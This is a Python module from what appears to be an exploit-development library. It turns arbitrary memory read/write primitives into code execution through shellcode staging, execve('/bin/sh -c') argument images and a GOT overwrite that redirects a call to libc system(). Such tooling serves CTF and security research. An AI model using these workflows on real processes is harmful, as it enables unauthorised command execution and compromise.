"""Strict adapters for using arbitrary-read/write primitives with payloads.

An arbitrary-memory primitive is transport, not control flow.  This module
keeps those capabilities separate: :class:`ArbitraryMemory` moves bytes,
:class:`PayloadStager` checks whether staged code may execute, and callers must
supply an explicit :class:`ControlFlowTrigger` or
:class:`FunctionCallPrimitive` before anything is invoked.

Primitive callbacks use absolute target addresses::

    read_at(address, size) -> bytes
    write_at(address, data) -> None | number_of_bytes_written

``None`` is the conventional success result for a write callback.  A callback
which can report a byte count should do so; short counts are rejected.  For
callbacks which cannot report counts, enable read-back verification in
:class:`IOPrimitiveTraits` when a read primitive is also available.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from math import lcm
from typing import Any, Callable, Protocol, Sequence, runtime_checkable

from .errors import ConstraintError, MemoryAccessError, UnsupportedTargetError
from .libc import LibcIdentity, LibcImage
from .model import Mitigations, Payload, PayloadKind, Permission, RuntimeLayout
from .target import FunctionPointerModel, Target


ReadAt = Callable[[int, int], bytes]
WriteAt = Callable[[int, bytes], int | None]
PermissionPrimitive = Callable[[int, int], Any]
CacheSyncPrimitive = Callable[[int, int], Any]


class ShortReadError(MemoryAccessError):
    """A read callback returned fewer or more bytes than requested."""

    def __init__(self, address: int, expected: int, actual: int) -> None:
        self.address = address
        self.expected = expected
        self.actual = actual
        super().__init__(
            f"short read at {address:#x}: expected exactly {expected} bytes, got {actual}"
        )


class ShortWriteError(MemoryAccessError):
    """A write callback reported a non-exact byte count."""

    def __init__(self, address: int, expected: int, actual: int) -> None:
        self.address = address
        self.expected = expected
        self.actual = actual
        super().__init__(
            f"short write at {address:#x}: expected exactly {expected} bytes, wrote {actual}"
        )


class WriteVerificationError(MemoryAccessError):
    """Read-back bytes did not equal the bytes supplied to ``write``."""

    def __init__(self, address: int, expected: bytes, actual: bytes) -> None:
        self.address = address
        self.expected = expected
        self.actual = actual
        limit = min(len(expected), len(actual))
        mismatch = next((index for index in range(limit) if expected[index] != actual[index]), limit)
        super().__init__(
            f"write verification failed at {address:#x}: first mismatch at +{mismatch:#x}; "
            f"expected {len(expected)} bytes, read back {len(actual)}"
        )


@dataclass(frozen=True, slots=True)
class IOPrimitiveTraits:
    """Machine-checkable constraints of an arbitrary-memory primitive.

    ``*_chunk`` is the largest transfer passed to one callback.  ``*_width``
    is the callback's transfer quantum: callback sizes must be a multiple of
    it.  ``*_alignment`` constrains callback addresses.  The framework never
    silently over-reads or performs a read/modify/write to satisfy these
    constraints; an inexact request is rejected instead.

    ``invalid_read_safe`` means that probing an invalid address is known not
    to kill or corrupt the target.  It gates :meth:`ArbitraryMemory.probe` and
    is deliberately unrelated to ordinary reads of known-valid ranges.
    ``verify_writes`` makes read-back comparison the default for every write.
    """

    read_chunk: int | None = None
    write_chunk: int | None = None
    read_alignment: int = 1
    write_alignment: int = 1
    read_width: int = 1
    write_width: int = 1
    invalid_read_safe: bool = False
    verify_writes: bool = False

    def __post_init__(self) -> None:
        for name in ("read_alignment", "write_alignment", "read_width", "write_width"):
            value = getattr(self, name)
            if not isinstance(value, int) or isinstance(value, bool) or value <= 0:
                raise ValueError(f"{name} must be a positive integer")
        for direction in ("read", "write"):
            chunk = getattr(self, f"{direction}_chunk")
            width = getattr(self, f"{direction}_width")
            if chunk is None:
                continue
            if not isinstance(chunk, int) or isinstance(chunk, bool) or chunk <= 0:
                raise ValueError(f"{direction}_chunk must be a positive integer or None")
            if chunk < width or chunk % width:
                raise ValueError(f"{direction}_chunk must be a positive multiple of {direction}_width")
        for name in ("invalid_read_safe", "verify_writes"):
            if not isinstance(getattr(self, name), bool):
                raise TypeError(f"{name} must be bool")

    @property
    def max_read_chunk(self) -> int | None:
        """Compatibility spelling which makes the maximum semantics explicit."""

        return self.read_chunk

    @property
    def max_write_chunk(self) -> int | None:
        """Compatibility spelling which makes the maximum semantics explicit."""

        return self.write_chunk


# A short, convenient public spelling.
PrimitiveTraits = IOPrimitiveTraits


def _checked_nonnegative(value: int, name: str) -> int:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError(f"{name} must be an integer")
    if value < 0:
        raise ValueError(f"{name} cannot be negative")
    return value


def _check_range(target: Target, address: int, size: int) -> None:
    _checked_nonnegative(address, "address")
    _checked_nonnegative(size, "size")
    if address > target.mask or (size and address + size - 1 > target.mask):
        raise MemoryAccessError(
            f"range {address:#x}+{size:#x} does not fit the {target.bits}-bit target address space"
        )


def _chunks(
    address: int,
    size: int,
    *,
    maximum: int | None,
    alignment: int,
    width: int,
    operation: str,
) -> tuple[tuple[int, int], ...]:
    if not size:
        return ()
    if address % alignment:
        raise MemoryAccessError(
            f"{operation} address {address:#x} is not aligned to {alignment} bytes"
        )
    if size % width:
        raise MemoryAccessError(
            f"{operation} size {size} is not a multiple of primitive width {width}"
        )
    transfer_step = lcm(alignment, width)
    result: list[tuple[int, int]] = []
    offset = 0
    while offset < size:
        remaining = size - offset
        if maximum is None or remaining <= maximum:
            amount = remaining
        else:
            # A non-final chunk must advance to another aligned callback
            # address.  Select the largest legal step within the maximum.
            amount = maximum - maximum % transfer_step
            if not amount:
                raise MemoryAccessError(
                    f"{operation} chunk maximum {maximum} is too small for alignment/width step {transfer_step}"
                )
        current = address + offset
        if current % alignment:
            raise MemoryAccessError(
                f"chunked {operation} address {current:#x} is not aligned to {alignment} bytes; "
                f"choose a chunk size compatible with the alignment"
            )
        result.append((current, amount))
        offset += amount
    return tuple(result)


class ArbitraryMemory:
    """Target-bound exact arbitrary-memory I/O.

    At least one callback must be supplied.  Read and write methods never
    truncate target addresses, pad primitive-width requests, or assume that a
    callback's short result is usable.
    """

    def __init__(
        self,
        target: Target,
        *,
        read_at: ReadAt | None = None,
        write_at: WriteAt | None = None,
        traits: IOPrimitiveTraits | None = None,
    ) -> None:
        if not isinstance(target, Target):
            raise TypeError("target must be a resolved Target")
        if read_at is None and write_at is None:
            raise ValueError("at least one of read_at or write_at is required")
        if read_at is not None and not callable(read_at):
            raise TypeError("read_at must be callable")
        if write_at is not None and not callable(write_at):
            raise TypeError("write_at must be callable")
        self.target = target
        self.read_at = read_at
        self.write_at = write_at
        self.traits = traits or IOPrimitiveTraits()
        if self.traits.verify_writes and read_at is None:
            raise ValueError("verify_writes requires a read_at callback")

    @classmethod
    def from_bytes_provider(
        cls,
        provider: Any,
        target: Target,
        *,
        traits: IOPrimitiveTraits | None = None,
        base_address: int | None = None,
    ) -> "ArbitraryMemory":
        """Adapt a ``pwnc.types.BytesProvider``-shaped object structurally.

        No provider class is imported and ``isinstance`` is not used.  This
        also works with debugger providers from outside pwnc which expose
        ``read(offset, size)``, optional ``write(offset, data)``, and either an
        ``address`` property or an explicit ``base_address`` here.
        """

        if not callable(getattr(provider, "read", None)):
            raise TypeError("provider must expose read(offset, size)")
        provider_bits = getattr(provider, "ptrbits", None)
        if provider_bits is not None and provider_bits != target.bits:
            raise ConstraintError(
                f"provider pointer width {provider_bits} does not match target width {target.bits}"
            )
        provider_byteorder = getattr(provider, "byteorder", None)
        expected_byteorder = 0 if target.endian.value == "little" else 1
        if provider_byteorder in (0, 1) and provider_byteorder != expected_byteorder:
            raise ConstraintError(
                f"provider byte order does not match {target.endian.value}-endian target"
            )
        if base_address is None:
            try:
                base_address = provider.address
            except (AttributeError, TypeError) as exc:
                raise ValueError("provider has no address; pass base_address explicitly") from exc
        base = _checked_nonnegative(base_address, "base_address")

        def provider_read(address: int, size: int) -> bytes:
            if address < base:
                raise MemoryAccessError(
                    f"absolute read address {address:#x} is below provider base {base:#x}"
                )
            return provider.read(address - base, size)

        provider_write_method = getattr(provider, "write", None)
        provider_write: WriteAt | None = None
        if callable(provider_write_method):

            def provider_write(address: int, data: bytes) -> int | None:
                if address < base:
                    raise MemoryAccessError(
                        f"absolute write address {address:#x} is below provider base {base:#x}"
                    )
                return provider_write_method(address - base, data)

        return cls(target, read_at=provider_read, write_at=provider_write, traits=traits)

    def _require_reader(self) -> ReadAt:
        if self.read_at is None:
            raise MemoryAccessError("this arbitrary-memory interface has no read primitive")
        return self.read_at

    def _require_writer(self) -> WriteAt:
        if self.write_at is None:
            raise MemoryAccessError("this arbitrary-memory interface has no write primitive")
        return self.write_at

    def read(self, address: int, size: int) -> bytes:
        """Read exactly ``size`` bytes, applying the declared chunking rules."""

        _check_range(self.target, address, size)
        reader = self._require_reader()
        pieces: list[bytes] = []
        for chunk_address, chunk_size in _chunks(
            address,
            size,
            maximum=self.traits.read_chunk,
            alignment=self.traits.read_alignment,
            width=self.traits.read_width,
            operation="read",
        ):
            try:
                result = reader(chunk_address, chunk_size)
            except Exception as exc:
                raise MemoryAccessError(f"read failed at {chunk_address:#x} for {chunk_size} bytes: {exc}") from exc
            if not isinstance(result, (bytes, bytearray, memoryview)):
                raise MemoryAccessError(
                    f"read callback at {chunk_address:#x} returned {type(result).__name__}, not bytes-like data"
                )
            data = bytes(result)
            if len(data) != chunk_size:
                raise ShortReadError(chunk_address, chunk_size, len(data))
            pieces.append(data)
        return b"".join(pieces)

    def write(self, address: int, data: bytes | bytearray | memoryview, *, verify: bool | None = None) -> int:
        """Write all bytes and optionally compare an exact read-back."""

        if not isinstance(data, (bytes, bytearray, memoryview)):
            raise TypeError("data must be bytes-like")
        if verify is not None and not isinstance(verify, bool):
            raise TypeError("verify must be bool or None")
        raw = bytes(data)
        _check_range(self.target, address, len(raw))
        writer = self._require_writer()
        offset = 0
        for chunk_address, chunk_size in _chunks(
            address,
            len(raw),
            maximum=self.traits.write_chunk,
            alignment=self.traits.write_alignment,
            width=self.traits.write_width,
            operation="write",
        ):
            chunk = raw[offset : offset + chunk_size]
            try:
                result = writer(chunk_address, chunk)
            except Exception as exc:
                raise MemoryAccessError(f"write failed at {chunk_address:#x} for {chunk_size} bytes: {exc}") from exc
            if result is not None:
                if not isinstance(result, int) or isinstance(result, bool):
                    raise MemoryAccessError(
                        f"write callback at {chunk_address:#x} returned {type(result).__name__}; "
                        "expected None or an integer byte count"
                    )
                if result != chunk_size:
                    raise ShortWriteError(chunk_address, chunk_size, result)
            offset += chunk_size

        should_verify = self.traits.verify_writes if verify is None else verify
        if should_verify:
            if self.read_at is None:
                raise ConstraintError("write verification requested, but no read_at callback is available")
            actual = self.read(address, len(raw))
            if actual != raw:
                raise WriteVerificationError(address, raw, actual)
        return len(raw)

    def read_ptr(self, address: int) -> int:
        """Read one pointer using the target word width and byte order."""

        return self.target.unpack(self.read(address, self.target.word_size))

    def write_ptr(self, address: int, value: int, *, verify: bool | None = None) -> int:
        """Pack and write one checked target pointer."""

        return self.write(address, self.target.pack(value), verify=verify)

    def probe(self, address: int, size: int = 1) -> bool:
        """Return whether a range is readable when invalid reads are declared safe."""

        if not self.traits.invalid_read_safe:
            raise ConstraintError(
                "probe is disabled because invalid_read_safe was not declared for this primitive"
            )
        try:
            self.read(address, size)
        except MemoryAccessError:
            return False
        return True

    def as_bytes_provider(self, base_address: int = 0) -> "ArbitraryMemoryBytesProvider":
        """Expose this interface through the small ``BytesProvider`` protocol."""

        return ArbitraryMemoryBytesProvider(self, base_address)


@dataclass(frozen=True, slots=True)
class ArbitraryMemoryBytesProvider:
    """A dependency-free, ``BytesProvider``-shaped view of arbitrary memory.

    It intentionally uses structural typing rather than subclassing
    ``pwnc.types.BytesProvider``.  Consumers which require nominal ABC
    membership can wrap the ``read``/``write`` methods in their local provider
    subclass without making the standalone payload package depend on pwnc.
    """

    memory: ArbitraryMemory
    _base_address: int = 0
    byteorder: int = field(init=False)
    ptrbits: int = field(init=False)

    def __post_init__(self) -> None:
        _check_range(self.memory.target, self._base_address, 0)
        # These integer values match pwnc.types.provider.ByteOrder, while the
        # adapter itself does not import that module.
        object.__setattr__(self, "byteorder", 0 if self.memory.target.endian.value == "little" else 1)
        object.__setattr__(self, "ptrbits", self.memory.target.bits)

    @property
    def address(self) -> int:
        return self._base_address

    def read(self, offset: int, size: int) -> bytes:
        return self.memory.read(self._base_address + offset, size)

    def write(self, offset: int, data: bytes) -> None:
        self.memory.write(self._base_address + offset, data)

    def rebase(self, address: int) -> "ArbitraryMemoryBytesProvider":
        return ArbitraryMemoryBytesProvider(self.memory, address)


# A spelling which is easier to discover from the existing provider API.
BytesProviderAdapter = ArbitraryMemoryBytesProvider


@runtime_checkable
class ControlFlowTrigger(Protocol):
    """A target-specific primitive which can transfer control to an address."""

    target: Target

    def trigger(self, address: int) -> Any: ...


@runtime_checkable
class FunctionCallPrimitive(Protocol):
    """A target-specific primitive which can make an exact ABI function call."""

    target: Target
    function_descriptor_aware: bool

    def call(self, address: int, arguments: tuple[int, ...]) -> Any: ...


@dataclass(slots=True)
class CallbackControlFlowTrigger:
    """Adapt ``callback(entry_address)`` into a control-flow primitive."""

    target: Target
    trigger_at: Callable[[int], Any]

    def __post_init__(self) -> None:
        if not callable(self.trigger_at):
            raise TypeError("trigger_at must be callable")

    def trigger(self, address: int) -> Any:
        _check_range(self.target, address, 1)
        return self.trigger_at(address)


@dataclass(slots=True)
class CallbackFunctionCall:
    """Adapt ``callback(function_address, argument_tuple)`` into a call primitive."""

    target: Target
    call_at: Callable[[int, tuple[int, ...]], Any]
    function_descriptor_aware: bool = False

    def __post_init__(self) -> None:
        if not callable(self.call_at):
            raise TypeError("call_at must be callable")
        if not isinstance(self.function_descriptor_aware, bool):
            raise TypeError("function_descriptor_aware must be bool")

    def call(self, address: int, arguments: tuple[int, ...]) -> Any:
        _check_range(self.target, address, 1)
        for index, argument in enumerate(arguments):
            if not isinstance(argument, int) or isinstance(argument, bool):
                raise TypeError(f"function argument {index} must be an integer")
            if argument < 0 or argument > self.target.mask:
                raise OverflowError(f"function argument {index} does not fit {self.target.bits} bits")
        return self.call_at(address, arguments)


def _require_same_target(actual: Target, expected: Target, what: str) -> None:
    if actual != expected:
        raise ConstraintError(f"{what} target {actual.name} does not match payload target {expected.name}")


def _call_address(function: "ExactLibcFunction", primitive: FunctionCallPrimitive) -> int:
    _require_same_target(primitive.target, function.target, "call primitive")
    if function.target.function_pointer_model is FunctionPointerModel.PPC64_ELFV1_DESCRIPTOR:
        if not primitive.function_descriptor_aware:
            raise UnsupportedTargetError(
                "PPC64 ELFv1 calls require a function-descriptor and TOC-aware call primitive"
            )
        return function.address
    return function.target.function_pointer(function.address)


@dataclass(frozen=True, slots=True)
class StagedPayload:
    """A payload whose bytes and execution policy have been prepared."""

    payload: Payload
    load_address: int
    entry_address: int
    verified: bool
    permission_changed: bool
    cache_synchronized: bool

    def execute(self, trigger: ControlFlowTrigger) -> Any:
        """Transfer control explicitly; staging alone never executes bytes."""

        if trigger is None:
            raise ConstraintError("arbitrary read/write cannot execute a payload; supply a control-flow trigger")
        if not isinstance(trigger, ControlFlowTrigger):
            raise TypeError("trigger must implement ControlFlowTrigger")
        _require_same_target(trigger.target, self.payload.target, "control-flow trigger")
        return trigger.trigger(self.entry_address)


class PayloadStager:
    """Write a :class:`Payload` after preflighting target execution policy."""

    def __init__(
        self,
        memory: ArbitraryMemory,
        mitigations: Mitigations,
        *,
        make_executable: PermissionPrimitive | None = None,
        synchronize_instruction_cache: CacheSyncPrimitive | None = None,
    ) -> None:
        if not isinstance(memory, ArbitraryMemory):
            raise TypeError("memory must be ArbitraryMemory")
        if not isinstance(mitigations, Mitigations):
            raise TypeError("mitigations must be Mitigations")
        if make_executable is not None and not callable(make_executable):
            raise TypeError("make_executable must be callable")
        if synchronize_instruction_cache is not None and not callable(synchronize_instruction_cache):
            raise TypeError("synchronize_instruction_cache must be callable")
        self.memory = memory
        self.mitigations = mitigations
        self.make_executable = make_executable
        self.synchronize_instruction_cache = synchronize_instruction_cache

    @staticmethod
    def _needs_execution(payload: Payload) -> bool:
        return payload.kind is PayloadKind.SHELLCODE or any(
            requirement.permissions & Permission.EXECUTE for requirement in payload.memory
        )

    @staticmethod
    def _code_alignment(payload: Payload) -> int:
        alignments = [
            requirement.alignment
            for requirement in payload.memory
            if requirement.permissions & Permission.EXECUTE
        ]
        return max(alignments, default=1)

    def stage(
        self,
        payload: Payload,
        load_address: int,
        *,
        executable_region: bool = False,
        verify: bool | None = None,
    ) -> StagedPayload:
        """Write bytes and perform required permission/cache preparation.

        Policy is checked before the first write.  ``executable_region`` is a
        caller assertion about this exact range, not a mitigation guess.
        """

        if not isinstance(payload, Payload):
            raise TypeError("payload must be Payload")
        if not isinstance(executable_region, bool):
            raise TypeError("executable_region must be bool")
        if verify is not None and not isinstance(verify, bool):
            raise TypeError("verify must be bool or None")
        _require_same_target(self.memory.target, payload.target, "arbitrary-memory primitive")
        _check_range(payload.target, load_address, len(payload.data))
        needs_execution = self._needs_execution(payload)
        needs_cache_sync = bool(
            needs_execution and payload.metadata.get("requires_instruction_cache_sync_after_runtime_write", False)
        )
        permission_change_needed = bool(
            needs_execution
            and not executable_region
            and not self.mitigations.writable_memory_is_executable
        )

        if needs_execution:
            alignment = self._code_alignment(payload)
            if load_address % alignment:
                raise ConstraintError(
                    f"payload load address {load_address:#x} is not aligned to code requirement {alignment}"
                )
            self.mitigations.require_shellcode_path(
                can_change_permissions=self.make_executable is not None,
                executable_region=executable_region,
            )
            if needs_cache_sync and self.synchronize_instruction_cache is None:
                raise ConstraintError(
                    "payload requires instruction-cache synchronization after a runtime write; "
                    "supply synchronize_instruction_cache"
                )

        # Resolve verification before mutating memory, so a missing reader does
        # not leave a payload half-staged.
        should_verify = self.memory.traits.verify_writes if verify is None else verify
        if should_verify and self.memory.read_at is None:
            raise ConstraintError("payload verification requested, but no read_at callback is available")

        self.memory.write(load_address, payload.data, verify=should_verify)
        if permission_change_needed:
            assert self.make_executable is not None  # established by require_shellcode_path
            self.make_executable(load_address, len(payload.data))
        if needs_cache_sync:
            assert self.synchronize_instruction_cache is not None
            self.synchronize_instruction_cache(load_address, len(payload.data))

        return StagedPayload(
            payload=payload,
            load_address=load_address,
            entry_address=payload.entry(load_address),
            verified=bool(should_verify),
            permission_changed=permission_change_needed,
            cache_synchronized=needs_cache_sync,
        )

    def stage_and_execute(
        self,
        payload: Payload,
        load_address: int,
        trigger: ControlFlowTrigger,
        *,
        executable_region: bool = False,
        verify: bool | None = None,
    ) -> Any:
        """Stage and invoke through a mandatory, explicit trigger."""

        if trigger is None:
            raise ConstraintError("arbitrary read/write cannot execute a payload; supply a control-flow trigger")
        staged = self.stage(payload, load_address, executable_region=executable_region, verify=verify)
        return staged.execute(trigger)


@dataclass(frozen=True, slots=True)
class ExactLibcFunction:
    """One absolute symbol address tied to an exact libc artifact identity."""

    symbol: str
    address: int
    target: Target
    identity: LibcIdentity

    def __post_init__(self) -> None:
        if not self.symbol:
            raise ValueError("libc function symbol cannot be empty")
        if not isinstance(self.target, Target):
            raise TypeError("target must be a resolved Target")
        if not isinstance(self.identity, LibcIdentity):
            raise TypeError("identity must be a LibcIdentity from an exact artifact")
        _check_range(self.target, self.address, 1)

    @classmethod
    def resolve(
        cls,
        image: LibcImage,
        symbol: str,
        layout: RuntimeLayout,
    ) -> "ExactLibcFunction":
        if not isinstance(image, LibcImage):
            raise TypeError("image must be an exact LibcImage, not a version or raw offset")
        if not isinstance(layout, RuntimeLayout):
            raise TypeError("layout must be RuntimeLayout with an exact libc base")
        address = image.address(symbol, layout)
        assert isinstance(address, int)
        return cls(symbol, address, image.target, image.identity)


def resolve_exact_libc_function(
    image: LibcImage,
    symbol: str,
    layout: RuntimeLayout,
) -> ExactLibcFunction:
    """Resolve a function without accepting distro-version offset guesses."""

    return ExactLibcFunction.resolve(image, symbol, layout)


def _cstring(value: str | bytes, name: str) -> bytes:
    if isinstance(value, str):
        raw = value.encode()
    elif isinstance(value, (bytes, bytearray, memoryview)):
        raw = bytes(value)
    else:
        raise TypeError(f"{name} must be str or bytes-like")
    if not raw:
        raise ValueError(f"{name} cannot be empty")
    if b"\0" in raw:
        raise ValueError(f"{name} cannot contain a NUL byte")
    return raw + b"\0"


def _align(value: int, alignment: int) -> int:
    return (value + alignment - 1) // alignment * alignment


@dataclass(frozen=True, slots=True)
class ExecveDataPayload:
    """Absolute addresses into an endian-aware ``execve`` data image."""

    payload: Payload
    load_address: int
    path_address: int
    argv_address: int
    envp_address: int
    argument_addresses: tuple[int, ...]
    environment_addresses: tuple[int, ...]


def build_execve_data_payload(
    target: Target,
    load_address: int,
    executable: str | bytes,
    argv: Sequence[str | bytes],
    *,
    environment: Sequence[str | bytes] = (),
) -> ExecveDataPayload:
    """Build strings plus target-width ``argv``/``envp`` pointer arrays."""

    if not isinstance(target, Target):
        raise TypeError("target must be a resolved Target")
    _check_range(target, load_address, 0)
    if load_address % target.word_size:
        raise ConstraintError(
            f"execve data load address {load_address:#x} must be aligned to target word size {target.word_size}"
        )
    if not argv:
        raise ValueError("argv must contain at least argv[0]")

    image = bytearray()

    def append_string(value: str | bytes, name: str) -> int:
        offset = len(image)
        image.extend(_cstring(value, name))
        return offset

    path_offset = append_string(executable, "executable")
    argument_offsets = tuple(append_string(value, f"argv[{index}]") for index, value in enumerate(argv))
    environment_offsets = tuple(
        append_string(value, f"environment[{index}]") for index, value in enumerate(environment)
    )
    image.extend(b"\0" * (_align(len(image), target.word_size) - len(image)))
    argv_offset = len(image)
    for offset in argument_offsets:
        image.extend(target.pack(load_address + offset))
    image.extend(target.pack(0))

    if environment_offsets:
        envp_offset = len(image)
        for offset in environment_offsets:
            image.extend(target.pack(load_address + offset))
        image.extend(target.pack(0))
        envp_address = load_address + envp_offset
    else:
        envp_address = 0

    _check_range(target, load_address, len(image))
    payload = Payload(
        data=bytes(image),
        target=target,
        kind=PayloadKind.DATA,
        description="execve path, argv, and environment data",
        memory=(),
        metadata={
            "operation": "execve-data",
            "load_address": load_address,
            "pointer_width": target.bits,
            "endian": target.endian.value,
        },
    )
    return ExecveDataPayload(
        payload=payload,
        load_address=load_address,
        path_address=load_address + path_offset,
        argv_address=load_address + argv_offset,
        envp_address=envp_address,
        argument_addresses=tuple(load_address + offset for offset in argument_offsets),
        environment_addresses=tuple(load_address + offset for offset in environment_offsets),
    )


def build_shell_command_execve_data(
    command: str | bytes,
    target: Target,
    load_address: int,
) -> ExecveDataPayload:
    """Build data for ``execve('/bin/sh', ['/bin/sh', '-c', command], NULL)``."""

    # Validate command independently so an empty command cannot hide behind a
    # non-empty argv array.
    command_bytes = _cstring(command, "command")[:-1]
    return build_execve_data_payload(
        target,
        load_address,
        b"/bin/sh",
        (b"/bin/sh", b"-c", command_bytes),
    )


@dataclass(frozen=True, slots=True)
class ExecveCallWorkflow:
    """Stage an argv image and call exact-artifact libc ``execve``."""

    data: ExecveDataPayload
    execve: ExactLibcFunction

    def __post_init__(self) -> None:
        if not isinstance(self.execve, ExactLibcFunction):
            raise TypeError("execve must be an ExactLibcFunction resolved from LibcImage")
        if self.execve.symbol != "execve":
            raise ValueError(f"expected exact libc symbol 'execve', got {self.execve.symbol!r}")
        _require_same_target(self.execve.target, self.data.payload.target, "exact libc function")

    @classmethod
    def from_libc(
        cls,
        data: ExecveDataPayload,
        libc: LibcImage,
        layout: RuntimeLayout,
    ) -> "ExecveCallWorkflow":
        return cls(data, ExactLibcFunction.resolve(libc, "execve", layout))

    def execute(
        self,
        stager: PayloadStager,
        call: FunctionCallPrimitive,
        *,
        verify: bool | None = None,
    ) -> Any:
        _require_same_target(stager.memory.target, self.data.payload.target, "payload stager")
        stager.stage(self.data.payload, self.data.load_address, verify=verify)
        function_address = _call_address(self.execve, call)
        return call.call(
            function_address,
            (self.data.path_address, self.data.argv_address, self.data.envp_address),
        )


@dataclass(frozen=True, slots=True)
class GotSystemWorkflow:
    """Temporarily replace a writable GOT slot with exact libc ``system``.

    The original slot is restored in a ``finally`` block whenever the call
    primitive returns or raises.  No restoration is possible if the target
    process exits, the transport disconnects, or control never returns.
    """

    target: Target
    mitigations: Mitigations
    system: ExactLibcFunction
    got_address: int
    plt_address: int
    command_address: int
    command: str | bytes

    def __post_init__(self) -> None:
        if not isinstance(self.system, ExactLibcFunction):
            raise TypeError("system must be an ExactLibcFunction resolved from LibcImage")
        if self.system.symbol != "system":
            raise ValueError(f"expected exact libc symbol 'system', got {self.system.symbol!r}")
        _require_same_target(self.system.target, self.target, "exact libc function")
        _check_range(self.target, self.got_address, self.target.word_size)
        _check_range(self.target, self.plt_address, 1)
        encoded = _cstring(self.command, "command")
        _check_range(self.target, self.command_address, len(encoded))
        object.__setattr__(self, "command", encoded[:-1])

    @classmethod
    def from_libc(
        cls,
        target: Target,
        mitigations: Mitigations,
        libc: LibcImage,
        layout: RuntimeLayout,
        *,
        got_address: int,
        plt_address: int,
        command_address: int,
        command: str | bytes,
    ) -> "GotSystemWorkflow":
        return cls(
            target,
            mitigations,
            ExactLibcFunction.resolve(libc, "system", layout),
            got_address,
            plt_address,
            command_address,
            command,
        )

    def execute(
        self,
        memory: ArbitraryMemory,
        call: FunctionCallPrimitive,
        *,
        verify: bool | None = None,
    ) -> Any:
        # All strategy and target checks happen before the first read/write.
        self.mitigations.require_got_overwrite()
        _require_same_target(memory.target, self.target, "arbitrary-memory primitive")
        _require_same_target(call.target, self.target, "call primitive")
        system_address = _call_address(self.system, call)
        if self.target.function_pointer_model is FunctionPointerModel.PPC64_ELFV1_DESCRIPTOR:
            raise UnsupportedTargetError(
                "PPC64 ELFv1 GOT replacement needs descriptor/TOC material, not a raw system address"
            )
        plt_address = self.target.function_pointer(self.plt_address)

        original = memory.read_ptr(self.got_address)
        command = bytes(self.command) + b"\0"
        memory.write(self.command_address, command, verify=verify)
        memory.write_ptr(self.got_address, system_address, verify=verify)
        try:
            return call.call(plt_address, (self.command_address,))
        finally:
            memory.write_ptr(self.got_address, original, verify=verify)


__all__ = [
    "ArbitraryMemory",
    "ArbitraryMemoryBytesProvider",
    "BytesProviderAdapter",
    "CallbackControlFlowTrigger",
    "CallbackFunctionCall",
    "CacheSyncPrimitive",
    "ControlFlowTrigger",
    "ExactLibcFunction",
    "ExecveCallWorkflow",
    "ExecveDataPayload",
    "FunctionCallPrimitive",
    "GotSystemWorkflow",
    "IOPrimitiveTraits",
    "PermissionPrimitive",
    "PayloadStager",
    "PrimitiveTraits",
    "ReadAt",
    "ShortReadError",
    "ShortWriteError",
    "StagedPayload",
    "WriteAt",
    "WriteVerificationError",
    "build_execve_data_payload",
    "build_shell_command_execve_data",
    "resolve_exact_libc_function",
]
